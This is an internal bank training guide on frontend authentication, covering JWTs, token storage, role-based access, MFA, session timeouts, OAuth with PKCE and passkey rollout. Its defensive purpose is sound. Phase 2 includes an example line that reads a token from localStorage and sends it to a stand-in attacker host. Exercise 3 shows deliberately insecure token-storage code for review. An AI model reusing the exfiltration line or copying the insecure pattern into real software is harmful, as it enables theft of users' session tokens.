# A11 — Authentication Part 1: Concepts

> **EastWest Bank — Digital Platforms & Innovations**
>
> Part A (Core) · Level 5 — Data and Auth · Est. 3 hours

---

## What You Will Learn

By the end of this guide, you will:

- Understand JWT structure and lifecycle
- Know why access tokens must never be stored in localStorage
- Design role-based access control (RBAC) for banking applications
- Understand multi-factor authentication (MFA) and its BSP mandate
- Know the AFASA timeline and what it means for EastWest Bank
- Understand OAuth 2.0 and OpenID Connect flows
- Design session management with security constraints

---

## Prerequisites

| Requirement | Where |
|------------|-------|
| Completed B03 — API Integration | Level 5 |
| Completed A03 — Thinking in Compliance | Level 1 |

---

## Phase 1 — Authentication Fundamentals

### What authentication actually is

Authentication answers: **"Who are you?"**
Authorization answers: **"What can you do?"**

In banking, getting either wrong has immediate financial consequences. An
unauthenticated user seeing another customer's balance is a BSP 982 violation.
An authenticated user accessing admin functions is a BSP 808 violation.

### The authentication flow

```
User                    Frontend              Backend              Database
  │                        │                     │                    │
  │── Enter credentials ──→│                     │                    │
  │                        │── POST /auth/login──→│                    │
  │                        │                     │── Verify password─→│
  │                        │                     │←─ User record ────│
  │                        │                     │                    │
  │                        │                     │── Generate JWT ────│
  │                        │                     │── Set HttpOnly ────│
  │                        │                     │   cookie (refresh) │
  │                        │←─ { user, token } ──│                    │
  │                        │                     │                    │
  │                        │── Store token ──────│                    │
  │                        │   (in memory ONLY)  │                    │
  │←── Show dashboard ────│                     │                    │
```

### Checkpoint 1

What is the difference between a session cookie and a JWT? Why does EWB use both
(HttpOnly cookie for refresh, JWT for access)?

---

## Phase 2 — JWT Deep Dive

### JWT structure

A JSON Web Token has three parts separated by dots:

```
header.payload.signature
```

**Header** — Algorithm and token type:
```json
{
  "alg": "RS256",
  "typ": "JWT"
}
```

**Payload** — Claims (data):
```json
{
  "sub": "user-123",
  "name": "Juan Santos",
  "email": "juan@ewb.com",
  "role": "customer",
  "iat": 1710288000,
  "exp": 1710289800,
  "iss": "ewb-auth",
  "aud": "ewb-digital"
}
```

**Signature** — Cryptographic proof:
```
RSASHA256(base64UrlEncode(header) + "." + base64UrlEncode(payload), privateKey)
```

### Standard JWT claims

| Claim | Name | Purpose |
|-------|------|---------|
| `sub` | Subject | User ID |
| `iat` | Issued At | When the token was created |
| `exp` | Expiration | When the token expires |
| `iss` | Issuer | Who created the token |
| `aud` | Audience | Who the token is for |
| `jti` | JWT ID | Unique token identifier (for revocation) |

### Token lifetimes at EWB

| Token | Lifetime | Storage | Purpose |
|-------|----------|---------|---------|
| Access Token | 30 minutes | In-memory (Zustand) | API authentication |
| Refresh Token | 7 days | HttpOnly cookie | Get new access tokens |
| MFA Token | 5 minutes | In-memory | Temporary, pre-MFA |

### Why NOT localStorage

This is the most critical security decision in frontend auth:

| Storage | XSS Vulnerable | CSRF Vulnerable | Survives Reload |
|---------|---------------|----------------|----------------|
| localStorage | **Yes** — any script can read it | No | Yes |
| sessionStorage | **Yes** — any script can read it | No | No |
| HttpOnly cookie | No — JavaScript cannot read it | **Yes** — mitigated with SameSite | Yes |
| In-memory (Zustand) | **No** — lost on reload | No | No |

If an attacker injects JavaScript via XSS (cross-site scripting), they can:

```js
// This is what an attacker does with localStorage tokens
const token = localStorage.getItem('accessToken');
fetch('https://evil.com/steal', { body: token });
```

With in-memory storage, the token is a JavaScript variable that is lost on
page reload. The refresh token in an HttpOnly cookie handles re-authentication
transparently.

> **Important caveat:** In-memory storage is XSS-*resistant*, not XSS-*proof*.
> If an attacker achieves XSS on your page, they can still read JavaScript
> variables in the same execution context. In-memory storage prevents *passive*
> token theft (malicious browser extensions, third-party scripts scanning
> `localStorage`), but an active XSS exploit can still extract the token.
> This is why XSS prevention (CSP headers, input sanitization, no `dangerouslySetInnerHTML`)
> remains the primary defense — in-memory storage is a second layer, not a substitute.

> **BSP 982 Section 5.4:** "Authentication credentials and session tokens shall
> be protected from unauthorized access, including but not limited to protection
> against cross-site scripting attacks."

### Checkpoint 2

A developer proposes storing the access token in sessionStorage because "it's
cleared when the tab closes, so it's safe enough." Explain why this is wrong
and what attack vector it opens.

---

## Phase 3 — Role-Based Access Control (RBAC)

### EWB role hierarchy

```
admin
  └── manager
        └── teller
              └── customer
```

| Role | Permissions |
|------|------------|
| `customer` | View own accounts, make transfers, view own transactions |
| `teller` | All customer permissions + view assigned customers, process deposits |
| `manager` | All teller permissions + approve large transfers, view branch reports |
| `admin` | All permissions + manage users, view audit logs, system configuration |

### RBAC types in frontend

```tsx
// src/types/auth.ts
export type Role = 'customer' | 'teller' | 'manager' | 'admin';

export interface User {
  id: string;
  name: string;
  email: string;
  role: Role;
  branch?: string;
  permissions?: string[];
}
```

### Permission checking

```tsx
// src/lib/permissions.ts
import type { Role } from '@/types/auth';

const roleHierarchy: Record<Role, number> = {
  customer: 0,
  teller: 1,
  manager: 2,
  admin: 3,
};

export function hasMinimumRole(userRole: Role, requiredRole: Role): boolean {
  return roleHierarchy[userRole] >= roleHierarchy[requiredRole];
}

// This uses role hierarchy (manager inherits teller access).
// B02's RoleGuard uses allowedRoles.includes() for exact matching.
// Choose one pattern for your project — hierarchy is more flexible
// for banking apps where managers should access all teller features.
export function canAccessRoute(userRole: Role, routeRoles: Role[]): boolean {
  return routeRoles.some((role) => hasMinimumRole(userRole, role));
}
```

### RBAC in the UI

```tsx
// src/components/auth/role-guard.tsx
import { useAuthStore } from '@/stores/auth-store';
import { hasMinimumRole } from '@/lib/permissions';
import type { Role } from '@/types/auth';

interface RoleGuardProps {
  requiredRole: Role;
  children: React.ReactNode;
  fallback?: React.ReactNode;
}

export function RoleGuard({ requiredRole, children, fallback = null }: RoleGuardProps) {
  const user = useAuthStore((state) => state.user);

  if (user == null || !hasMinimumRole(user.role, requiredRole)) {
    return fallback;
  }

  return children;
}
```

Usage:

```tsx
<RoleGuard requiredRole="manager">
  <ApproveTransferButton />
</RoleGuard>
```

> **BSP 808 Reminder:** Frontend RBAC is a UX convenience — the **backend must
> always verify permissions** independently. A determined user can bypass any
> frontend check.

### Checkpoint 3

Why must the backend verify permissions even when the frontend has role guards?
Give a specific attack scenario.

---

## Phase 4 — Multi-Factor Authentication (MFA)

### Why MFA is mandatory

BSP Circular 982 and the AFASA mandate require multi-factor authentication for
all financial transactions. MFA combines two or more:

| Factor | Type | Example |
|--------|------|---------|
| Something you **know** | Knowledge | Password, PIN |
| Something you **have** | Possession | Phone (OTP), security key, passkey |
| Something you **are** | Inherence | Fingerprint, face recognition |

### MFA flow for banking

```
User                    Frontend              Backend
  │                        │                     │
  │── Username + Password──→│                     │
  │                        │── POST /auth/login──→│
  │                        │←─ { mfaRequired,  ──│
  │                        │     mfaToken,       │
  │                        │     methods: ['otp'] }
  │                        │                     │
  │←── Show OTP screen ───│                     │
  │                        │                     │
  │── Enter OTP code ─────→│                     │
  │                        │── POST /auth/mfa ───→│
  │                        │   { mfaToken, code } │
  │                        │←─ { user, token } ──│
  │                        │                     │
  │←── Show dashboard ────│                     │
```

The key insight: after password verification, the backend returns an `mfaToken`
(not an access token). This temporary token is only valid for the MFA step —
it cannot be used to access any API endpoint.

### MFA state machine

```tsx
// src/types/auth.ts
export type AuthStep =
  | { status: 'idle' }
  | { status: 'credentials' }
  | { status: 'mfa-required'; mfaToken: string; methods: string[] }
  | { status: 'mfa-verifying' }
  | { status: 'authenticated' }
  | { status: 'error'; message: string };
```

Using a discriminated union for auth state ensures you cannot accidentally
show the dashboard in the `mfa-required` state — TypeScript will not let you
access `user` or `accessToken` until `status` is `'authenticated'`.

### Rate limiting and brute force UX

The backend will rate-limit login attempts (typically 5 failed attempts per
account within 15 minutes). The frontend must handle this gracefully:

```tsx
// src/features/auth/components/login-form.tsx (rate limit handling)
function getLoginErrorMessage(error: ApiError): string {
  switch (error.code) {
    case 'ACCOUNT_LOCKED':
      return 'Your account has been temporarily locked after multiple failed attempts. Please try again in 15 minutes or contact support.';
    case 'RATE_LIMITED':
      return 'Too many login attempts. Please wait before trying again.';
    case 'INVALID_CREDENTIALS':
      // Never reveal whether the username or password was wrong
      return 'Invalid username or password.';
    default:
      return 'An error occurred. Please try again.';
  }
}
```

Key rules for login error handling:
- **Never reveal which field was wrong** — "Invalid username or password" (not
  "User not found" or "Wrong password"). This prevents username enumeration.
- **Show a countdown timer** when rate-limited so users know when to retry.
- **Disable the submit button** during the lockout period to prevent frustration.
- **Log all failed attempts** for BSP 1019 audit trail requirements.

### Checkpoint 4

A developer wants to skip MFA for "low-risk" transactions like viewing an
account balance. Under BSP 982, is this acceptable? Under AFASA, what
additional requirements apply?

---

## Phase 5 — Session Management

### Session lifecycle

```
Login → Active → Idle Warning → Timeout → Logout
                   ↑      ↓
                   └──────┘
                 User activity
                 resets timer
```

### Session timeout requirements

| Parameter | Value | BSP Reference |
|-----------|-------|--------------|
| Session timeout | 15 minutes idle | BSP 982 Section 5.3 |
| Warning before timeout | 2 minutes | UX best practice |
| Maximum session duration | 8 hours | BSP 1105 |
| Re-auth for sensitive operations | Required | BSP 982 Section 5.4 |

### Session timeout concept

```tsx
// src/hooks/use-session-timeout.ts (concept — implementation in B04)
// Track user activity: mouse, keyboard, touch, scroll
// Show warning dialog at (timeout - warningTime)
// Force logout at timeout
// Reset timer on any user activity
// Sensitive operations (transfer > 50,000 PHP) require re-authentication
```

### Token refresh strategy

```
Time ──────────────────────────────────────────────────→

Access Token: [====30min====][====30min====][====30min====]
                             ↑              ↑
                        Auto-refresh    Auto-refresh
                        (silent)        (silent)

Refresh Token: [===============7 days===============]
                                                     ↑
                                                Force login
```

The access token expires every 30 minutes. When an API call gets a 401, the
interceptor (from B03) silently refreshes the access token using the HttpOnly
cookie. The user sees no interruption.

When the refresh token expires (7 days), the user must log in again with
full credentials + MFA.

### Token revocation

When a token is compromised (or suspected compromised), the frontend must
support immediate session termination:

```tsx
// src/features/auth/api/auth-api.ts
import axios from 'axios';
import { env } from '@/lib/env';

export async function revokeSession(): Promise<void> {
  // Use plain axios, not apiClient — during revocation the access token may
  // already be expired, and the interceptor would trigger a refresh loop.
  await axios.post(`${env.VITE_API_BASE_URL}/auth/revoke`, null, { withCredentials: true });
}

export async function revokeAllSessions(): Promise<void> {
  // Invalidate ALL refresh tokens for this user (all devices)
  await axios.post(`${env.VITE_API_BASE_URL}/auth/revoke-all`, null, { withCredentials: true });
}
```

Scenarios requiring token revocation:
- **Password change** — revoke all other sessions
- **Suspicious activity detected** — revoke the compromised session
- **User logs out** — revoke the current session's refresh token
- **Admin action** — revoke all sessions for a user (e.g., terminated employee)

> **BSP 982 Section 5.4:** Systems must provide the ability to immediately
> terminate authenticated sessions when unauthorized access is detected.

The key insight: revoking an access token is not possible (it is stateless and
valid until it expires). Revocation works by invalidating the refresh token on
the server. When the short-lived access token expires, the refresh attempt
fails, and the user is forced to re-authenticate.

---

## Phase 6 — OAuth 2.0 and OpenID Connect

### When OAuth matters

EWB uses OAuth 2.0 for:
- Third-party integrations (BSP 1122 — Open Finance)
- Partner bank connections
- Enterprise SSO (Azure AD)

### OAuth 2.0 Authorization Code Flow with PKCE

```
User          Frontend         Auth Server        Resource Server
  │              │                  │                    │
  │── Click ────→│                  │                    │
  │  "Login"     │── Generate ─────│                    │
  │              │   code_verifier │                    │
  │              │   code_challenge│                    │
  │              │                  │                    │
  │←─ Redirect ─│                  │                    │
  │   to Auth    │                  │                    │
  │   Server     │                  │                    │
  │              │                  │                    │
  │── Login at ─────────────────→│                    │
  │   Auth Server                  │                    │
  │←── Redirect back ────────────│                    │
  │   with ?code=abc               │                    │
  │              │                  │                    │
  │──────────────→── POST /token ─→│                    │
  │              │  { code,         │                    │
  │              │    code_verifier }│                    │
  │              │←─ { access,     │                    │
  │              │     refresh }   │                    │
  │              │                  │                    │
  │              │── GET /accounts ─────────────────→│
  │              │   Authorization: Bearer token      │
  │              │←─ Account data ──────────────────│
```

**PKCE** (Proof Key for Code Exchange) prevents authorization code interception
attacks. The frontend generates a random `code_verifier`, hashes it to create
a `code_challenge`, and sends the challenge with the auth request. When
exchanging the code for tokens, the frontend proves it initiated the flow by
sending the original `code_verifier`.

### Why PKCE is mandatory for SPAs

SPAs cannot keep client secrets — all code is visible in the browser. PKCE
replaces client secrets with a per-request cryptographic proof. Without PKCE,
an attacker who intercepts the authorization code (via a malicious redirect or
browser extension) could exchange it for tokens.

> **BSP 1122:** Open Finance APIs must use OAuth 2.0 with PKCE for all
> third-party integrations. Authorization Code flow only — Implicit flow is
> deprecated.

### Checkpoint 5

Why is the Implicit OAuth flow (which returns tokens directly in the URL
fragment) deprecated and not used at EWB?

---

## Phase 7 — AFASA and the June 2026 Deadline

### What AFASA requires

BSP Circular 1213 (AFASA — Anti-Financial Account Scam Act) mandates:

1. **Phishing-resistant authentication** — Passkeys/WebAuthn preferred
2. **Transaction verification** — Additional confirmation for high-risk operations
3. **Device binding** — Associate authenticated sessions with registered devices
4. **Real-time fraud detection** — Flag suspicious activity patterns

### The timeline

```
January 2026          March 2026          June 2026
     │                    │                    │
     │                    │  ← You are here    │
     │                    │                    │
     ├── Phase 1 ────────→│                    │
     │   Internal testing  ├── Phase 2 ────────→│
     │   Staff enrollment  │   Customer rollout  │
     │                    │   Migration support │── Deadline
     │                    │                    │   Full compliance
```

### What "phishing-resistant" means

Traditional authentication is phishable:

| Method | Phishable? | How |
|--------|-----------|-----|
| Password | Yes | Fake login page captures it |
| SMS OTP | Yes | SIM swap, SS7 interception |
| Email OTP | Yes | Email compromise |
| TOTP (authenticator app) | Yes | Real-time phishing proxy |
| **Passkey (WebAuthn)** | **No** | Origin-bound, cryptographic |

Passkeys are phishing-resistant because they are bound to the origin
(domain). A passkey created for `ewbanking.com` will **never** work on
`ewbanking-login.com` — the browser enforces this cryptographically.

### Checkpoint 6

Your team receives a BSP compliance audit question: "Describe how your
frontend authentication system prevents credential phishing." Write a
2-paragraph response referencing specific BSP circulars and the technical
mechanisms used.

---

## Key Takeaways

1. **Access tokens in memory, refresh tokens in HttpOnly cookies.** Never
   localStorage or sessionStorage (BSP 982).

2. **JWTs are not encrypted** — they are signed. Never put sensitive data in
   JWT payloads. Anyone can decode the payload; only the server can verify
   the signature.

3. **Frontend RBAC is for UX, not security.** The backend must always verify
   permissions independently.

4. **MFA is mandatory for banking** (BSP 982). The auth flow must support
   a distinct MFA step with its own temporary token.

5. **Session timeout is 15 minutes** (BSP 982). Users must be warned before
   automatic logout.

6. **PKCE is mandatory for SPAs** using OAuth 2.0. Never use Implicit flow.

7. **AFASA deadline is June 2026** — passkeys must be implemented and
   deployed before then.

---

## Exercises

### Exercise 1 — JWT Analysis
Given a JWT token, decode it (without verification) and identify all standard
claims. Calculate when the token expires in human-readable format.

### Exercise 2 — RBAC Design
Design a permission system for a new feature: "Branch Manager Dashboard" that
shows all tellers' transactions for the day. Define which roles can access it,
what data each role can see, and which actions each role can perform.

### Exercise 3 — Security Review
Review this code and identify all security issues:
```tsx
const login = async (username, password) => {
  const { data } = await axios.post('/auth/login', { username, password });
  localStorage.setItem('token', data.token);
  localStorage.setItem('user', JSON.stringify(data.user));
  localStorage.setItem('refreshToken', data.refreshToken);
};
```

---

## What Comes Next

**Next guide:** [B04 — Authentication Part 2](B04_authentication-part2.md) —
where you implement everything from this guide: the auth store, login flow,
session timeout, protected routes, and the token refresh interceptor.

---

*EastWest Bank Digital Platforms & Innovations | Confidential*
